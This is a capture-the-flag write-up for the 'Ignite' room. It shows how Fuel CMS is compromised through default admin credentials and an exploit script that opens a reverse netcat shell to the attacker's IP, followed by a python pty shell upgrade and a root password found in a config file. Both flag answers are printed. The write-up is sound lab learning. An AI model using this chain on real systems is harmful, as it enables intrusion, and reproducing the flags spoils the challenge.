# Ignite 

```
export ip=10.10.245.227
```

# Find User.txt

```
First things first as always start with the nmap scan
```
```json
nmap -sC -sV -A -oN scans/nmap_normal "YOUR_TARGET_IP"
```
```
so looks like only http on port 80 is runnong so lets check what we can find. 
Theres a admin dashboard with default credenitals, lets see if they were lazy enough to not change it yet.
looks like they were.
```
```
Nothing we can abuse on the site so lets turn to the power of google and search for exploits. This site is call Fuel CMS.
```
```
So there is a few exploits and the one i went with was quite unkown however it was amazing. Spawns a netcat shell automatically (I have included the exploit file in github!)
```
```json
python3 exploit.py "YOUR_TARGET_WEB_ADDRESS" "YOUR_IP" "YOUR_CHOICE_OF_PORT"
```
```
Now we can just go to the home folder and locate User.txt and capture the flag using cat
```
```
Answer: 6470e394cbf6dab6a91682cc8585059b
```
# Find Root.txt

```
As always lets upgrade our shell to a fully interactive one using python as this box has python installed (which we know by doing the command "which python")
```
```json
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
Now for enerumation i usually run "sudo -L" first and then search for SUID'S in linux boxes however this machine doesnt allow sudo -L and didnt have any suid's for us to exploit.
```
```
So after searching extensively through the box, I located the password in the /var/www/html/fuel/application/config/database.php
which is very anti climatic
```
```
The root password is "mememe"
```
```
Now all we have to do is run "su" type the password and voila we are root
```
```
Head on over to /root and cat out Root.txt 
```
```
Answer: b9bbcb33e11b80be759c4e844862482d
```
```json
Congrats we have completed the room! 
```